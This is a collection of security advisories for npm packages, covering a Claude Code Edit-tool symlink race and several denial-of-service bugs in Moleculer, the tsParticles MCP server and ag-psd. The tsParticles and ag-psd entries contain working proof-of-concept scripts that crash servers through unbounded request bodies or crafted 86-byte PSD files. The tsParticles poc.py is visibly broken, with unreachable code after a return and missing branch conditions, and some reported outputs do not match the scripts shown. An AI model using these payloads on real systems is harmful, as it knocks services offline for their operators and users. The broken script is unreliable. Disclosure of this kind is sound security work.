entry.title: [@anthropic-ai/claude-code] Claude Code: TOCTOU Race in Edit Tool Allows File Writes Outside the Workspace
entry.content:
Claude Code validated Edit tool targets using point-in-time pathname and symlink resolution that was not bound to the underlying directory inodes or file descriptors. On macOS, a process running inside Claude Code's Bash sandbox could exploit the resulting time-of-check to time-of-use window by atomically swapping an in-workspace parent directory with a symlink after validation completed, causing the unsandboxed Edit implementation to overwrite an attacker-selected user-writable file outside the workspace. Exploiting this required the ability to run attacker-controlled code inside the sandbox, such as through a malicious repository or dependency script.

Users on standard Claude Code auto-update have received this fix automatically. Users performing manual updates are advised to update to the latest version.

Claude Code thanks hackerone.com/mahoraga007 (Sunder Singh) for reporting this issue.

entry.title: [moleculer] Moleculer: Unauthenticated Denial of Service via negative length field in the TCP transporter packet parser
entry.content:
Summary

The TCP transporter's packet parser (src/transporters/tcp/parser.js) reads the packet length field with Buffer.prototype.readInt32BE, a signed read. A crafted packet whose length field has the sign bit set yields a negative length. The parser then advances past the parsed message with packet = packet.slice(length), but Buffer.prototype.slice clamps an out-of-range negative start index to 0, so the buffer is returned unchanged. The while (packet.length > 0) loop condition therefore never becomes false, producing an infinite synchronous loop that blocks the Node.js event loop indefinitely.

Impact

Any Moleculer node using the TCP transporter can be rendered completely unresponsive by an unauthenticated remote peer sending a single ~10-byte crafted TCP packet, before any protocol handshake or authentication takes place. TcpReader.onTcpClientConnected pipes each accepted socket's bytes straight into a fresh Parser instance (socket.pipe(parser)) with no handshake, so the code path is reachable by any peer able to reach the transporter's listening port. Because Node.js is single-threaded, the hang blocks the entire event loop of the process, taking down every service hosted in it until it is forcibly restarted. TCP transporter endpoints are frequently auto-discovered via UDP broadcast, so any host on the same network segment can reach the port.

Neither the CRC check nor maxPacketSize mitigate the issue: the CRC bytes are fully attacker-computable, and maxPacketSize bounds the received buffer size, not the value of the length field.

Affected component

Parser._write in src/transporters/tcp/parser.js.

Patch

The fix validates that the decoded length is at least the 6-byte header size before processing, rejecting negative and undersized values (which would otherwise fail to shrink the buffer) with an error on the write callback instead of looping.

Credit

Reported by xor4xor via the Tidelift security program.

References

  • https://github.com/moleculerjs/moleculer/security/advisories/GHSA-h89v-g948-47vp
  • https://nvd.nist.gov/vuln/detail/CVE-2026-97705
  • https://github.com/moleculerjs/moleculer/commit/168ecbdc245c9a9d1dc4ef9b8a81dbae38ee3063
  • https://github.com/moleculerjs/moleculer/commit/914074e502ae403a0338ad168b45b16d6bcc3e44
  • https://github.com/moleculerjs/moleculer/releases/tag/v0.14.36

entry.title: [@tsparticles/mcp-server] tsParticles: A single anonymous MCP session can monopolize HTTP mode and deny new clients
entry.content:
Summary

The HTTP mode of @tsparticles/mcp-server creates a single stateful StreamableHTTPServerTransport instance and reuses it for all clients. The first anonymous client that initializes the MCP endpoint claims the shared transport state, and later clients cannot create their own sessions.

This was verified on v4.3.0 at commit 0266d469aa2d719cb66a9c6bf09aded4186ec17c. The same singleton transport pattern is still present in v4.3.1 and current main.

Affected Code

The server creates one shared transport before accepting requests:

const transport = new StreamableHTTPServerTransport({
  sessionIdGenerator: () => randomUUID(),
});

const httpServer = createServer(async (req, res) => {
  ...
  await transport.handleRequest(req, res, parsedBody);
});

Because the same transport object is reused across all requests, the first successful initialize call changes the state for all later clients.

Reproduction

Send two independent initialize requests without a prior mcp-session-id.

First request:

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"first-client","version":"1.0.0"}}}

Second request:

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"second-client","version":"1.0.0"}}}

Observed result in 3 out of 3 runs:

first response: HTTP 200 with mcp-session-id
second response: HTTP 400
{"jsonrpc":"2.0","error":{"code":-32600,"message":"Invalid Request: Server already initialized"},"id":null}

Impact

An unauthenticated remote client can win the first-session race and prevent all later legitimate clients from establishing new MCP sessions until the process is restarted. The first session remains functional, but new clients are denied service.

Recommendation

Create a transport per session or maintain a bounded session-id-to-transport map. Do not reuse one stateful transport instance for all HTTP clients.

References

  • https://github.com/tsparticles/tsparticles/security/advisories/GHSA-h7c4-q426-7jh9
  • https://nvd.nist.gov/vuln/detail/CVE-2026-76893
  • https://github.com/tsparticles/tsparticles/pull/5888
  • https://github.com/tsparticles/tsparticles/commit/d3b5672bd61bb847abfa21193c34eabf7aba6896
  • https://github.com/advisories/GHSA-h7c4-q426-7jh9

entry.title: [@tsparticles/mcp-server] tsParticles: Malformed JSON requests can terminate the @tsparticles/mcp-server HTTP process
entry.content:
Summary

The HTTP mode of @tsparticles/mcp-server parses incoming /mcp request bodies with JSON.parse() outside a request-local error boundary. A single malformed JSON request causes the async request handler to throw and terminates the Node.js process.

This was verified on v4.3.0 at commit 0266d469aa2d719cb66a9c6bf09aded4186ec17c. Version 4.3.1 appears to fix this by returning HTTP 400 for invalid JSON.

Affected Code

The vulnerable handler is:

if (req.method === "POST" && req.url === "/mcp") {
  const body = await new Promise<string>((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });

  const parsedBody = body ? JSON.parse(body) : undefined;
  await transport.handleRequest(req, res, parsedBody);
}

The JSON.parse() call is not wrapped in try/catch.

Reproduction

Start the HTTP server and send this malformed request:

POST /mcp HTTP/1.1
Content-Type: application/json
Mcp-Protocol-Version: 2025-11-25

{"jsonrpc":

Observed result in 3 out of 3 runs:

exit_code=1
SyntaxError: Unexpected end of JSON input
at Server.<anonymous> (integrations/mcp-server/src/index.ts:407:38)

Impact

An unauthenticated remote attacker can terminate the exposed MCP process with a single malformed request. The service remains unavailable until restarted by an external supervisor.

Recommendation

Wrap request parsing in a local try/catch and return a bounded HTTP 400 response such as:

{"error":"Invalid JSON"}

The process should remain alive after malformed requests.

References

  • https://github.com/tsparticles/tsparticles/security/advisories/GHSA-4p8p-pjpq-2w7h
  • https://nvd.nist.gov/vuln/detail/CVE-2026-76892
  • https://github.com/tsparticles/tsparticles/pull/5875
  • https://github.com/tsparticles/tsparticles/commit/25fb70e7f527a91568adaef576570289083f243b
  • https://github.com/advisories/GHSA-4p8p-pjpq-2w7h

entry.title: [@tsparticles/mcp-server] tsParticles: Unbounded HTTP Request Body Buffering in @tsparticles/mcp-server Leads to Remote DoS
entry.content:
Summary

The HTTP server mode of @tsparticles/mcp-server accumulates all incoming request body chunks into an in-memory Buffer[] array with no size limit before calling JSON.parse. An unauthenticated remote attacker can stream an arbitrarily large body to POST /mcp, exhausting the Node.js process memory and causing a Denial of Service. The official Docker image ships with HTTP mode enabled by default (--port 3000 on 0.0.0.0), making this exploitable without any special configuration in containerized deployments.

Details

The vulnerability exists in integrations/mcp-server/src/index.ts at lines 399–407. The POST /mcp request handler resolves a Promise that pushes every incoming data chunk into a Buffer[] array without checking the cumulative size, a Content-Length header, or any other guard:

// integrations/mcp-server/src/index.ts:399-407
if (req.method === "POST" && req.url === "/mcp") {
  const body = await new Promise<string>((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));  // no size guard
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });

  const parsedBody = body ? JSON.parse(body) : undefined;

The complete data flow leading to exploitation:

  1. index.ts:390 — HTTP server is created.
  2. index.ts:399 — POST /mcp branch is entered; no authentication is performed.
  3. index.ts:401-403 — Every chunk is appended to chunks[] without any byte-count check.
  4. index.ts:407 — The concatenated buffer is passed to JSON.parse.
  5. index.ts:416 — The server listens on 0.0.0.0, exposing it on all network interfaces.

There is no Content-Length validation, no body-size middleware, and no 413 Payload Too Large response in the server source. The official Dockerfile (integrations/mcp-server/Dockerfile) sets CMD ["node", "dist/index.js", "--port", "3000"], meaning Docker deployments run in HTTP mode by default without any additional opt-in.

A suggested patch would be to track cumulative received bytes and destroy the request once a threshold (e.g., 1 MB) is exceeded:

--- a/integrations/mcp-server/src/index.ts
+++ b/integrations/mcp-server/src/index.ts
@@
 import { createServer } from "node:http";
 import { randomUUID } from "node:crypto";

 const PACKAGE_VERSION = "0.1.0";
+const maxRequestBodyBytes = 1024 * 1024;
@@
     if (req.method === "POST" && req.url === "/mcp") {
       const body = await new Promise<string>((resolve, reject) => {
         const chunks: Buffer[] = [];
-        req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));
+        let received = 0;
+        req.on("data", (chunk) => {
+          received += chunk.length;
+          if (received > maxRequestBodyBytes) {
+            req.destroy(new Error("Request body too large"));
+            return;
+          }
+          chunks.push(Buffer.from(chunk));
+        });
         req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
         req.on("error", reject);
       });

PoC

Environment setup:

# Build the Docker image from the repository root
docker build \
  -f /path/to/vuln-001/Dockerfile \
  -t vuln001-mcp \
  /path/to/tsparticles-repo

# Run with a 256 MB memory cap (matching the dynamic reproduction)
docker run -d \
  -p 127.0.0.1:3000:3000 \
  --memory=256m --memory-swap=256m \
  --name vuln001-mcp \
  vuln001-mcp

Exploit (Python PoC — poc.py):

The script uses chunked transfer encoding so only O(1 MB) of Python-side memory is needed, while the Node.js process accumulates every received chunk in its Buffer[] array.

python3 poc.py --host 127.0.0.1 --port 3000 --mb 300 --container vuln001-mcp

Equivalent minimal request:

import socket

s = socket.create_connection(("127.0.0.1", 3000))
headers = (
    "POST /mcp HTTP/1.1\r\n"
    "Host: 127.0.0.1:3000\r\n"
    "Content-Type: application/json\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: close\r\n\r\n"
).encode()
s.sendall(headers)

prefix = b'{"jsonrpc":"2.0","id":1,"method":"tools/list","params":"'
s.sendall(f"{len(prefix):x}\r\n".encode() + prefix + b"\r\n")

chunk = b"A" * (1024 * 1024)  # 1 MB per write
for _ in range(300):           # stream 300 MB total
    s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")

Expected result:

  • Baseline memory usage: ~24.9 MiB / 256 MiB.
  • After ~209 MB received, the server-side BrokenPipeError occurs as Docker's OOM-killer terminates the process.
  • docker inspect vuln001-mcp shows State.OOMKilled = true and State.Status = exited.

Dynamic reproduction confirmed: OOMKilled=true was observed during Phase 2 testing with a 300 MB stream against a container limited to 256 MB.

Impact

An unauthenticated remote attacker who can reach the POST /mcp HTTP endpoint can cause the Node.js server process to consume unbounded memory, leading to process termination (OOM kill) and complete service unavailability. No credentials or prior access are required.

In the default Docker deployment (CMD ["node", "dist/index.js", "--port", "3000"]), the server binds to 0.0.0.0:3000, making it reachable from any network interface without configuration changes. Any operator running the official Docker image is exposed by default.

The vulnerability is a Denial of Service (DoS) — confidentiality and integrity are not directly affected. Recovery requires restarting the container.

Reproduction artifacts

Dockerfile

# VULN-001: Unbounded HTTP Request Body Buffering in @tsparticles/mcp-server
# Build context must be the repository root so COPY paths resolve correctly.
# Build:  docker build -f vuln-001/Dockerfile -t vuln001-mcp .
# Run:    docker run -d -p 127.0.0.1:3000:3000 \
#                    --memory=256m --memory-swap=256m \
#                    --name vuln001-mcp vuln001-mcp

# --- Stage 1: compile TypeScript ---
FROM node:22-alpine AS build

WORKDIR /build

# Copy only the mcp-server package (avoids pulling the entire monorepo)
COPY integrations/mcp-server/package.json  ./package.json
COPY integrations/mcp-server/tsconfig.json ./tsconfig.json
COPY integrations/mcp-server/src/          ./src/

# Install all deps (devDeps needed for TypeScript compiler)
RUN npm install --no-audit --no-fund

# Compile TypeScript -> dist/
RUN npx tsc

# --- Stage 2: minimal runtime image ---
FROM node:22-alpine

WORKDIR /app

# Copy compiled JS and production node_modules
COPY --from=build /build/dist          ./dist
COPY --from=build /build/node_modules  ./node_modules

EXPOSE 3000

# Start HTTP mode on port 3000 — identical to the official Dockerfile CMD.
# No --max-old-space-size flag; memory cap is enforced by Docker --memory at run time.
CMD ["node", "dist/index.js", "--port", "3000"]

poc.py

#!/usr/bin/env python3
"""
PoC for VULN-001: Unbounded HTTP Request Body Buffering in @tsparticles/mcp-server
Repository : tsparticles/tsparticles
Version    : 4.3.0 (commit eb2d299)
CWE        : CWE-400 — Uncontrolled Resource Consumption
CVSS       : 7.5 High  (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
File       : integrations/mcp-server/src/index.ts:399-407

Vulnerability:
    The POST /mcp handler resolves a Promise that accumulates every data chunk
    into a Buffer[] array without any Content-Length or size guard, then calls
    Buffer.concat() and JSON.parse() on the full body.  An unauthenticated
    remote attacker can exhaust the server's memory by streaming an arbitrarily
    large body.

    Source (index.ts:399-407):
        if (req.method === "POST" && req.url === "/mcp") {
          const body = await new Promise<string>((resolve, reject) => {
            const chunks: Buffer[] = [];
            req.on("data", (chunk) => chunks.push(Buffer.from(chunk)));  // no guard
            req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
            req.on("error", reject);
          });
          const parsedBody = body ? JSON.parse(body) : undefined;

Exploit strategy:
    Stream a large body via chunked transfer encoding so the Python process
    itself needs only O(chunk) memory.  The Node.js server accumulates every
    chunk in its Buffer array.  With a Docker memory cap of 256 MB the container
    is OOM-killed once the buffered data exceeds available RAM, producing
    OOMKilled=true — an unambiguous, observable indicator.

Usage:
    python3 poc.py [--host 127.0.0.1] [--port 3000]
                   [--mb 300] [--container vuln001-mcp]
"""

import argparse
import socket
import subprocess
import sys
import time


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(description="VULN-001 PoC — unbounded body buffering")
    p.add_argument("--host",      default="127.0.0.1", help="Server host")
    p.add_argument("--port",      type=int, default=3000, help="Server port")
    p.add_argument("--mb",        type=int, default=300, help="Payload size in MB")
    p.add_argument("--container", default="vuln001-mcp", help="Docker container name")
    return p.parse_args()


def wait_for_server(host: str, port: int, timeout: int = 60) -> bool:
    """Poll TCP until the server accepts connections or timeout expires."""
    deadline = time.time() + timeout
    print(f"[*] Waiting for server at {host}:{port}  (timeout={timeout}s) ...", flush=True)
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=1)
            s.close()
            print("[+] Server is ready", flush=True)
            return True
        except OSError:
            time.sleep(0.5)
    print("[-] Timed out waiting for server")
    return False


def container_info(name: str) -> tuple[str, str, str]:
    """Return (status, mem_usage, oom_killed) strings for a Docker container."""
    status, oom = "unknown", "unknown"
    try:
        r = subprocess.run(
            ["docker", "inspect", "--format",
             "{{.State.Status}}|{{.State.OOMKilled}}", name],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode == 0:
            parts = r.stdout.strip().split("|")
            status = parts[0] if len(parts) > 0 else "unknown"
            oom    = parts[1] if len(parts) > 1 else "unknown"
    except Exception as exc:
        status = f"error({exc})"

    mem = "N/A"
    try:
        r2 = subprocess.run(
            ["docker", "stats", "--no-stream", "--format", "{{.MemUsage}}", name],
            capture_output=True, text=True, timeout=5,
        )
        mem = r2.stdout.strip() or "N/A"
    except Exception:
        pass

    return status, mem, oom


# ---------------------------------------------------------------------------
# Core exploit
# ---------------------------------------------------------------------------

def stream_large_body(host: str, port: int, total_mb: int) -> tuple[bool, int, bytes]:
    """
    Open a single TCP connection and stream a large body using chunked TE.

    Using chunked transfer encoding keeps this Python process's memory usage
    at O(1-MB chunk) while forcing the Node.js server to accumulate every
    received chunk in its Buffer[] array — the vulnerable code path.

    Returns:
        server_closed  — True if the server reset the connection mid-stream
        bytes_sent     — total body bytes sent
        response       — first bytes of the HTTP response (may be empty)
    """
    s = socket.create_connection((host, port))

    headers = (
        f"POST /mcp HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: application/json\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    s.sendall(headers)

    def send_chunk(data: bytes) -> None:
        s.sendall(f"{len(data):x}\r\n".encode() + data + b"\r\n")

    # Begin a JSON body prefix (the server buffers everything before parsing)
    prefix = b'{"jsonrpc":"2.0","id":1,"method":"tools/list","params":"'
    send_chunk(prefix)
    bytes_sent = len(prefix)

    chunk_size = 1024 * 1024   # 1 MB per TCP write
    filler     = b"A" * chunk_size
    target     = total_mb * 1024 * 1024
    server_closed = False

    while bytes_sent < target:
        remaining = target - bytes_sent
        chunk = filler[: min(chunk_size, remaining)]
        try:
            send_chunk(chunk)
            bytes_sent += len(chunk)
            mb_done = bytes_sent // (1024 * 1024)
            if mb_done % 50 == 0:
                print(f"[*]   {mb_done}/{total_mb} MB streamed ...", flush=True)
        except (BrokenPipeError, ConnectionResetError, OSError) as exc:
            print(f"[!] Connection reset after {bytes_sent // (1024 * 1024)} MB: {exc}",
                  flush=True)
            server_closed = True
            break

    if not server_closed:
        try:
            send_chunk(b'"}')
            s.sendall(b"0\r\n\r\n")  # final (empty) chunk = end of chunked body
        except OSError:
            server_closed = True

    response = b""
    if not server_closed:
        s.settimeout(5)
        try:
            response = s.recv(4096)
        except OSError:
            pass

    try:
        s.close()
    except OSError:
        pass

    return server_closed, bytes_sent, response


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> bool:
    args = parse_args()

    print("=" * 65)
    print("VULN-001 — Unbounded HTTP Body Buffering in @tsparticles/mcp-server")
    print(f"Target  : http://{args.host}:{args.port}/mcp   (no auth)")
    print(f"Payload : {args.mb} MB  (no Content-Length or body-size guard)")
    print(f"Monitor : Docker container '{args.container}'")
    print("=" * 65)

    if not wait_for_server(args.host, args.port):
        print("[FAIL] Server did not become available")
        return False

    # --- baseline ---
    status_before, mem_before, _ = container_info(args.container)
    print(f"\n[*] Baseline  status={status_before}  memory={mem_before}")

    # --- exploit ---
    print(f"\n[*] Streaming {args.mb} MB body to POST /mcp ...", flush=True)
    t0 = time.time()
    server_closed, bytes_sent, response = stream_large_body(
        args.host, args.port, args.mb
    )
    elapsed = time.time() - t0

    time.sleep(2)   # allow Docker stats to refresh

    status_after, mem_after, oom_killed = container_info(args.container)

    print(f"\n[*] Transfer       : {bytes_sent // (1024 * 1024)} MB in {elapsed:.1f} s")
    print(f"[*] Server closed  : {server_closed}")
    print(f"[*] HTTP response  : {response[:200]!r}")
    print(f"[*] Container      : status={status_after}  OOMKilled={oom_killed}")
    print(f"[*] Memory before  : {mem_before}")
    print(f"[*] Memory after   : {mem_after}")

    # --- verdict ---
    if oom_killed == "true":
        print("\n[PASS] OOMKilled=true — Docker OOM-killed the container")
        print("       The Node.js process was killed because it buffered the full")
        print("       request body in memory (no size guard in POST /mcp handler).")
        return True

    if status_after in ("exited", "dead"):
        print(f"\n[PASS] Container exited (status={status_after}) after receiving"
              f" {bytes_sent // (1024 * 1024)} MB body — memory exhaustion confirmed")
        return True

        print(f"       Memory before: {mem_before}  |  after: {mem_after}")
        print("       CWE-400 confirmed: unbounded buffering without authentication")
        return True

        print(f"\n[PARTIAL] Connection reset after {bytes_sent // (1024 * 1024)} MB")
        print("          Server may have crashed internally; check docker logs.")
        # Still consider PASS if container is dead
        if status_after not in ("running",):
            return True
        return False

    print("\n[INCONCLUSIVE] Unexpected outcome — inspect container logs manually")
    return False

entry.title: [ag-psd] ag-psd: Uncontrolled Memory Allocation in PSD Layer Decoding (totalMemoryLimit bypass)
entry.content:
Summary

The readPsd() function in ag-psd accepts a totalMemoryLimit option to cap memory usage when parsing untrusted PSD files, but this limit is never forwarded to the layer image buffer allocation path. A property name mismatch (totalMemoryLimit vs. memoryLimit) causes the size guard inside createImageDataBitDepth to be skipped unconditionally. An attacker who can supply a crafted PSD to any application using ag-psd for server-side parsing can force an unbounded heap allocation — a 5000×5000 layer in a 86-byte file allocates 200 MB — leading to denial of service through process memory exhaustion regardless of what limit the caller specified.

Details

readPsd() (exported from src/index.ts:22) wraps caller-supplied bytes in a PsdReader object that inherits ReadOptions, which defines totalMemoryLimit?: number (src/psd.ts:1819). A default of 2 GB is written into the reader at src/psdReader.ts:237.

When the parser reaches a layer, it calls decodeLayerImageData(layer, reader) at src/psdReader.ts:568-569, passing the reader object directly as the second argument. The decodeLayerImageData function signature is:

// src/psdReader.ts:639-642
function decodeLayerImageData(layer: Layer, options: {
    useImageData?: boolean,
    throwForMissingFeatures?: boolean,
    memoryLimit?: number   // ← expects "memoryLimit", not "totalMemoryLimit"
}) {
    const imageData = getDataFromLayer(layer, ..., options.memoryLimit);

Because reader has totalMemoryLimit but not memoryLimit, options.memoryLimit evaluates to undefined. This value is passed down to createImageDataBitDepth at src/psdReader.ts:684:

// src/psdReader.ts:671-684
const layerWidth  = (layer.right  || 0) - (layer.left || 0);
const layerHeight = (layer.bottom || 0) - (layer.top  || 0);
// ...
imageData = createImageDataBitDepth(layerWidth, layerHeight, bitsPerChannel, 4, memoryLimit);

Inside createImageDataBitDepth, the size guard at src/psdReader.ts:861-864 is:

const sizeInBytes = width * height * channels * Math.max(1, bitDepth / 8);
if (memoryLimit !== undefined && sizeInBytes > memoryLimit) throw new Error('Exceeded memory limit');

Because memoryLimit is undefined, the condition is always false. The allocation proceeds unconditionally at src/psdReader.ts:872:

return new Uint16Array(width * height * channels);   // attacker-controlled size

A secondary unbounded allocation exists at src/psdReader.ts:1138-1139, where inflateSync(compressed) decompresses ZIP-encoded channel data without any cap on the output size, enabling a similar DoS via ZIP bomb payloads.

PoC

Environment setup

# Clone and build ag-psd at the affected commit
git clone https://github.com/Agamnentzar/ag-psd.git
cd ag-psd
git checkout e64f0c96a5b8f9ea7c79599d08bbcfc57345b781
npm ci
npm run build

Build and run with Docker (self-contained)

# From the report directory (containing vuln-001/ and repo/)
docker build -t ag-psd-vuln-001 -f vuln-001/Dockerfile .
docker run --rm -e APP_DIR=/app -e RESULT_DIR=/tmp ag-psd-vuln-001

Manual reproduction (Node.js inline)

// save as exploit.js and run: node exploit.js
require('./initialize-canvas');
const { readPsd } = require('./dist');

const u16 = n => { const b = Buffer.alloc(2); b.writeUInt16BE(n); return b; };
const i16 = n => { const b = Buffer.alloc(2); b.writeInt16BE(n); return b; };
const u32 = n => { const b = Buffer.alloc(4); b.writeUInt32BE(n); return b; };
const i32 = n => { const b = Buffer.alloc(4); b.writeInt32BE(n); return b; };
const sec = (buf, r = 1) => Buffer.concat([u32(buf.length), buf, Buffer.alloc((r - buf.length % r) % r)]);

const w = 5000, h = 5000;
// Layer record: top=0, left=0, bottom=5000, right=5000, 0 channels, blending info, extra=0
const layer = Buffer.concat([
    i32(0), i32(0), i32(h), i32(w),
    u16(0),
    Buffer.from('8BIMnorm'),
    Buffer.from([255, 0, 0, 0]),
    u32(0),
]);
// PSD header: sig, version=1, reserved, channels=3, height=1, width=1, depth=16, colorMode=RGB
const psd = Buffer.concat([
    Buffer.from('8BPS'), u16(1), Buffer.alloc(6),
    u16(3), u32(1), u32(1), u16(16), u16(3),
    sec(Buffer.alloc(0)),              // ColorModeData
    sec(Buffer.alloc(0)),              // ImageResources
    sec(sec(Buffer.concat([i16(1), layer]), 2)),  // LayerAndMaskInfo
    u16(0), Buffer.alloc(6),           // ImageData (raw, minimal)
]);

const before = process.memoryUsage();
const out = readPsd(psd, { useImageData: true, totalMemoryLimit: 1024 });
const after = process.memoryUsage();

console.log('PSD_BYTES=' + psd.length);                                      // 86
console.log('LAYER_IMAGE_BYTES=' + out.children[0].imageData.data.byteLength); // 200000000
console.log('ARRAYBUFFER_DELTA=' + (after.arrayBuffers - before.arrayBuffers)); // 200000000

Expected output

PSD_BYTES=86
TOTAL_MEMORY_LIMIT_OPTION=1024
LAYER_IMAGE_BYTES=200000000
ARRAYBUFFER_DELTA=200000000
RSS_BEFORE_KB=55052
RSS_AFTER_KB=250508
VULN_001_EXPLOITED=true
PASS: totalMemoryLimit=1024 was bypassed; allocated 200000000 bytes in a single layer image buffer

A 1 KB totalMemoryLimit is completely ignored; a 190 MB buffer is allocated from an 86-byte PSD file.

Impact

This is a Denial of Service (DoS) vulnerability. Any application that uses ag-psd to parse PSD files supplied by external users — such as web services offering PSD preview, conversion, or editing — is vulnerable. An unauthenticated remote attacker can send a single crafted PSD file (as small as 86 bytes) to exhaust process heap memory, causing the Node.js process to crash or be killed by the OS OOM killer. The totalMemoryLimit option, which is the only documented defense against this class of attack, is silently non-functional due to the property name mismatch. No authentication, credentials, or special privileges are required. The bug lies on the default parser path and is triggered whenever layer decoding is enabled (the default).

Reproduction artifacts

Dockerfile

FROM node:20-bullseye-slim

# Install build dependencies for native canvas module
RUN apt-get update && apt-get install -y \
    python3 \
    make \
    g++ \
    pkg-config \
    libcairo2-dev \
    libpango1.0-dev \
    libjpeg-dev \
    libgif-dev \
    librsvg2-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the ag-psd repository
COPY repo/ /app/

# Install dependencies and build TypeScript
RUN npm ci && npm run build

# Copy the PoC script
COPY vuln-001/poc.py /app/poc.py

# Install Python 3 (already available in bullseye)
RUN python3 --version

# Default command: run the PoC
CMD ["python3", "poc.py"]

poc.py

#!/usr/bin/env python3
"""
PoC for VULN-001: Uncontrolled Memory Allocation in ag-psd PSD Layer Decoding
(CWE-770 / totalMemoryLimit bypass via property name mismatch)

Attack summary:
  readPsd(buffer, { totalMemoryLimit: 1024 }) is called with a 1 KB limit.
  Internally, decodeLayerImageData(layer, reader) is called where `reader`
  carries `totalMemoryLimit` but the function expects `memoryLimit`.
  Because options.memoryLimit === undefined the size check is bypassed and a
  5000x5000x4-channel Uint16Array (200 MB) is allocated from an 86-byte PSD.
"""

import struct
import subprocess
import sys
import os
import json

# ---------------------------------------------------------------------------
# Build a minimal valid 16-bit PSD with one 5000x5000 layer
# ---------------------------------------------------------------------------

def u16be(n: int) -> bytes:
    return struct.pack(">H", n)

def i16be(n: int) -> bytes:
    return struct.pack(">h", n)

def u32be(n: int) -> bytes:
    return struct.pack(">I", n)

def i32be(n: int) -> bytes:
    return struct.pack(">i", n)

def length_prefixed(data: bytes, align: int = 1) -> bytes:
    """Encode as 4-byte-length-prefixed section, padded to alignment."""
    pad = (align - len(data) % align) % align
    return u32be(len(data)) + data + b"\x00" * pad

def build_psd(width: int = 5000, height: int = 5000) -> bytes:
    """
    Build the smallest PSD that triggers the vulnerability:
    - 16-bit depth (bitsPerChannel=16) forces Uint16Array allocation
    - layer bounds set to [top=0, left=0, bottom=height, right=width]
    - totalMemoryLimit: 1024 bytes in readPsd options will be bypassed

    Resulting allocation: width * height * 4 channels * 2 bytes = 200 MB
    """
    # Layer record (28 bytes header + name/blending/channel-info)
    layer_record = b"".join([
        i32be(0),            # top
        i32be(0),            # left
        i32be(height),       # bottom
        i32be(width),        # right
        u16be(0),            # channel count = 0 (no raw channel data needed
                             # to trigger allocation — createImageDataBitDepth
                             # is called based on dimensions alone)
        # Blending range: signature + mode
        b"8BIM",
        b"norm",
        # Opacity, clipping, flags, filler
        bytes([255, 0, 0, 0]),
        # Extra data length = 0
        u32be(0),
    ])

    # Layer info section: layer count (signed i16) + layer record
    layer_info_inner = i16be(1) + layer_record
    layer_info = length_prefixed(layer_info_inner, 2)

    # Sections: ColorModeData, ImageResources, LayerAndMaskInfo, ImageData
    color_mode_data  = length_prefixed(b"")
    image_resources  = length_prefixed(b"")
    layer_mask_info  = length_prefixed(layer_info)
    image_data       = u16be(0) + b"\x00" * 6   # compression=raw + minimal data

    # PSD file header: magic, version=1, reserved, channels, height, width,
    #                  bitsPerChannel=16, colorMode=3 (RGB)
    header = b"8BPS" + u16be(1) + b"\x00" * 6 + u16be(3) + u32be(1) + u32be(1) + u16be(16) + u16be(3)

    psd = header + color_mode_data + image_resources + layer_mask_info + image_data
    return psd


# ---------------------------------------------------------------------------
# Node.js script that calls readPsd and reports memory usage
# ---------------------------------------------------------------------------

NODE_SCRIPT = r"""
'use strict';
const APP_DIR = process.env.APP_DIR || '/app';
try { require(APP_DIR + '/dist/initializeCanvas.js'); } catch(e) {}

const { readPsd } = require(APP_DIR + '/dist/index.js');
const fs = require('fs');

// Read PSD bytes from stdin
const psd = fs.readFileSync('/tmp/poc.psd');

const before = process.memoryUsage();

let result;
try {
    result = readPsd(psd, { useImageData: true, totalMemoryLimit: 1024 });
} catch (err) {
    process.stderr.write('ERROR: ' + err.message + '\n');
    process.exit(2);
}

const after = process.memoryUsage();

const layer = result && result.children && result.children[0];
const layerBytes = (layer && layer.imageData && layer.imageData.data)
    ? layer.imageData.data.byteLength
    : 0;

const delta = after.arrayBuffers - before.arrayBuffers;

console.log('PSD_BYTES=' + psd.length);
console.log('TOTAL_MEMORY_LIMIT_OPTION=1024');
console.log('LAYER_IMAGE_BYTES=' + layerBytes);
console.log('ARRAYBUFFER_DELTA=' + delta);
console.log('RSS_BEFORE_KB=' + Math.round(before.rss / 1024));
console.log('RSS_AFTER_KB='  + Math.round(after.rss  / 1024));

// Verdict
const exploited = layerBytes >= 100_000_000 || delta >= 100_000_000;
console.log('VULN_001_EXPLOITED=' + exploited);
if (!exploited) {
    process.stderr.write('FAIL: memory limit was NOT bypassed (layerBytes=' + layerBytes + ', delta=' + delta + ')\n');
    process.exit(1);
}
console.log('PASS: totalMemoryLimit=1024 was bypassed; allocated ' + layerBytes + ' bytes in a single layer image buffer');
process.exit(0);
"""


def main():
    print("[*] VULN-001 PoC — ag-psd CWE-770 totalMemoryLimit bypass")
    print("[*] Building crafted PSD (5000x5000 16-bit layer, no raw channel data)...")

    psd_bytes = build_psd(5000, 5000)
    poc_psd_path = "/tmp/poc.psd"
    node_script_path = "/tmp/poc_runner.js"

    with open(poc_psd_path, "wb") as f:
        f.write(psd_bytes)
    print(f"[*] PSD written to {poc_psd_path} ({len(psd_bytes)} bytes)")

    with open(node_script_path, "w") as f:
        f.write(NODE_SCRIPT)
